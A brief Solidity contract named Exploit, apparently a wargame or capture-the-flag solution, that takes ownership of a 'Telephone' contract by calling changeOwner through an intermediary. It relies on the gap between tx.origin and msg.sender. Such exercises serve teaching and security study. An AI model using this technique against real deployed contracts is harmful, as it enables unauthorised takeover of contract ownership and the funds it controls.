// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/console.sol";
import "./Telephone.sol";

contract Exploit {
    Telephone public telephone;

    constructor(address _telephoneAddress) {
        telephone = Telephone(_telephoneAddress);
        console.log("Exploit Address:", address(this));
    }

    function exploit(address _newOwner) public {
        // the tx.origin is the EOA calling this function
        // the msg.sender would be address(this)
        console.log("Exploiting");
        telephone.changeOwner(_newOwner);
    }
}